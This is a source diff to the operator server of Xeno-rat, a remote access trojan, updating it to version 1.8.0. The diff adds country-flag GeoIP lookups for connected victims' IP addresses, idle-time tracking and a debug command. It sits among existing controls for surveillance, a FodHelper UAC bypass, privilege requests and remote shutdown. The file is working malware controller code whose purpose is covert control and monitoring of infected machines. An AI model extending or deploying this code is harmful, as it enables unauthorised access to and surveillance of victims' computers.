@@ -27,18 +27,24 @@ using Newtonsoft.Json.Linq;
 using xeno_rat_server.Forms;
 using System.IO.Compression;
 using System.Net;
+using System.ComponentModel.Composition;
+using MaxMind.GeoIP2;
+using MaxMind.GeoIP2.Responses;
 
 namespace xeno_rat_server
 {
     public partial class MainForm : Form
     {
 
+        private DatabaseReader ip2countryDatabase;
+
         private Listener ListeningHandler;
         private static Dictionary<int, Node> clients = new Dictionary<int, Node>();
         private static int currentCount = 0;
         private static byte[] key = new byte[32] { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 };
         private static string string_key = "1234";
-        private static int ListviewItemCount = 6;
+        private static int ListviewItemCount_old = 6;
+        private static int ListviewItemCount = 7;
         private Dictionary<string, string[]> Commands = new Dictionary<string, string[]>();
         private List<string> OnConnectTasks = new List<string>();
         private System.Windows.Forms.Timer ConfigUpdateTimer;
@@ -51,7 +57,7 @@ namespace xeno_rat_server
         {
             
             InitializeComponent();
-            this.Text = "Xeno-rat: Created by moom825 - version 1.7.0";
+            this.Text = "Xeno-rat: Created by moom825 - version 1.8.0";
             key = Utils.CalculateSha256Bytes(string_key);
 
             ListeningHandler =new Listener(OnConnect);
@@ -99,6 +105,9 @@ namespace xeno_rat_server
             Uac_Options[0] = "Request admin";
             Uac_Options[1] = "De-escalate to user";
 
+            string[] Debug_Info = new string[1];
+            Debug_Info[0] = "Debug";
+
             Commands["Fun"] = Fun;
             Commands["Surveillance"] = Surveillance;
             Commands["System"] = System;
@@ -106,6 +115,7 @@ namespace xeno_rat_server
             Commands["Uac Options"] = Uac_Options;
             Commands["Client"] = Client;
             Commands["Power"] = Power;
+            Commands["Debug Info"] = Debug_Info;
         }
 
         private async Task OnConnect(Socket socket)
@@ -330,21 +340,52 @@ namespace xeno_rat_server
                     start=end;
                 }
             }
-            if (strings[strings.Length-1] == null) 
+            if (strings[strings.Length-2] == null) 
             {
                 return null;
+            }
+            if (strings[strings.Length - 1] == null) // this is here for combatibility reasons for older stubs
+            {
+                string[] temp = new string[strings.Length];
+                strings.CopyTo(temp, 0);
+                strings[2] = "N/A";
+
+                for (int i = 2; i < temp.Length-1; i++) 
+                {
+                    strings[i+1]= temp[i];
+                }
+
             }
             ListViewItem lvi = new ListViewItem();
             ListViewItem item=null;
             lvi.Tag = type0node;
+
+            string ipAddress = type0node.GetIp();
+
+            string flag = "missing";
+            try
+            {
+                CountryResponse ipData = ip2countryDatabase.Country(ipAddress);
+                if (ipData.Country!=null)
+                {
+                    flag = ipData.Country.IsoCode;
+                }
+                
+            }
+            catch 
+            { 
+            }
+            lvi.ImageKey = flag;
             lvi.Text = strings[0];
-            lvi.SubItems.Add(type0node.GetIp());
+            lvi.SubItems.Add(ipAddress);
             lvi.SubItems.Add(strings[1]);
             lvi.SubItems.Add(strings[2]);
             lvi.SubItems.Add(strings[3]);
             lvi.SubItems.Add(strings[4]);
             lvi.SubItems.Add(strings[5]);
+            lvi.SubItems.Add(strings[6]);
             lvi.SubItems.Add("");
+            lvi.SubItems.Add("0");
             lvi.SubItems.Add("0");
             listView2.Invoke((MethodInvoker)(() =>
             {
@@ -377,7 +418,7 @@ namespace xeno_rat_server
             {
                 return;
             }
-            byte[] get_curr_window = new byte[] { 0 };
+            byte[] get_update_info = new byte[] { 0 };
             Node subnode = await client.CreateSubNodeAsync(2);
             CompleteOnConnectTasks(client);
             if (subnode == null) 
@@ -388,7 +429,7 @@ namespace xeno_rat_server
             {
                 Stopwatch timer = new Stopwatch();
                 timer.Start();
-                await subnode.SendAsync(get_curr_window);
+                await subnode.SendAsync(get_update_info);
                 byte[] data=await subnode.ReceiveAsync();
                 timer.Stop();
                 TimeSpan timeTaken = timer.Elapsed;
@@ -396,13 +437,22 @@ namespace xeno_rat_server
                 {
                     break;
                 }
-                string window = Encoding.UTF8.GetString(data);
+                string info = Encoding.UTF8.GetString(data);
+                string window = info;
+                string idle_time = "N/A";
+                if (info.Contains("\n"))
+                {
+                    string[] split_data = info.Split('\n');
+                    window = split_data[0];
+                    idle_time = split_data[1];
+                }
                 listView2.BeginInvoke((MethodInvoker)(() =>
                 {
-                    item.SubItems[7].Text = window;
-                    item.SubItems[8].Text = ((int)timeTaken.TotalMilliseconds).ToString();
+                    item.SubItems[8].Text = window;
+                    item.SubItems[9].Text = ((int)timeTaken.TotalMilliseconds).ToString();
+                    item.SubItems[10].Text = idle_time;
                 }));
-                Thread.Sleep(2000);
+                await Task.Delay(2000);
             }
             subnode.Disconnect();
             
@@ -428,7 +478,6 @@ namespace xeno_rat_server
                 int op = data[0];
                 if (op == 3)
                 {
-                    
                     try {
                         string error_msg=Encoding.UTF8.GetString(data, 1, data.Length - 1);
                         if (LogErrors) 
@@ -442,7 +491,7 @@ namespace xeno_rat_server
                 {
                     break;
                 }
-                Thread.Sleep(1000);
+                await Task.Delay(1000);
             }
             MainSock.Disconnect();
         }
@@ -451,6 +500,7 @@ namespace xeno_rat_server
         {
             Icon = Icon.ExtractAssociatedIcon(System.Reflection.Assembly.GetExecutingAssembly().Location);
             listView2.GetType().GetProperty("DoubleBuffered", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic).SetValue(listView2, true, null);
+            listView3.GetType().GetProperty("DoubleBuffered", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic).SetValue(listView3, true, null);
             ConfigUpdateTimer = new System.Windows.Forms.Timer();
             ConfigUpdateTimer.Tick += new EventHandler(ConfigUpdateTimer_Tick);
             ConfigUpdateTimer.Interval = 10000;
@@ -459,6 +509,19 @@ namespace xeno_rat_server
                 DeserializeControlsFromJson(File.ReadAllText("Config.json"));
             }
             ConfigUpdateTimer.Start();
+
+            ImageList list = new ImageList();
+            foreach (string i in Directory.EnumerateFiles("country_flags")) 
+            {
+                if (i.EndsWith(".png")) 
+                {
+                    list.Images.Add(Path.GetFileName(i).Replace(".png", ""), Image.FromFile(i));
+                }
+                
+            }
+            listView2.SmallImageList = list;
+            ip2countryDatabase = new DatabaseReader(Path.Combine("country_flags", "GeoLite2-Country.mmdb"));
+
             AddLog("Started!", Color.Green);
         }
 
@@ -649,7 +712,7 @@ namespace xeno_rat_server
             lvi.Text = DateTime.Now.ToString("hh:mm:ss tt");
             lvi.SubItems.Add(message);
             lvi.ForeColor = textcolor;
-            listView3.BeginInvoke((MethodInvoker)(() => { listView3.Items.Add(lvi); }));
+            listView3.BeginInvoke((MethodInvoker)(() => { listView3.Items.Insert(0, lvi); }));
         }
         
         private async Task StartChat(Node client)
@@ -1213,6 +1276,26 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with SystemPower dll!");
             }
         }
+
+        private async Task StartDebugInfo(Node client) 
+        {
+            try
+            {
+                Node subClient = await client.CreateSubNodeAsync(2);
+                if (subClient==null)
+                {
+                    MessageBox.Show("Error connecting socket");
+                    return;
+                }
+                Application.Run(new Forms.DebugInfo(subClient));
+                subClient.Disconnect();
+            }
+            catch
+            {
+                MessageBox.Show("Error with Debug Form!");
+            }
+        }
+
         private void StartPlugin(Func<Node, Task> func, Node client) 
         {
             Task.Run(() => func(client));
@@ -1287,11 +1370,11 @@ namespace xeno_rat_server
             {
                 StartPlugin(StartFodHelperBypass, client);
             }
-            else if (command == "Request admin") 
+            else if (command == "Request admin")
             {
                 StartPlugin(StartRequestForAdmin, client);
             }
-            else if (command == "De-escalate to user") 
+            else if (command == "De-escalate to user")
             {
                 StartPlugin(StartDeescalateperms, client);
             }
@@ -1334,7 +1417,6 @@ namespace xeno_rat_server
             else if (command == "Uninstall")
             {
                 StartPlugin(StartUninstall, client);
-
             }
             else if (command == "Shutdown")
             {
@@ -1343,6 +1425,10 @@ namespace xeno_rat_server
             else if (command == "Restart")
             {
                 StartPlugin(StartRestart, client);
+            }
+            else if (command == "Debug") 
+            {
+                StartPlugin(StartDebugInfo, client);
             }
             Console.WriteLine(command);
 
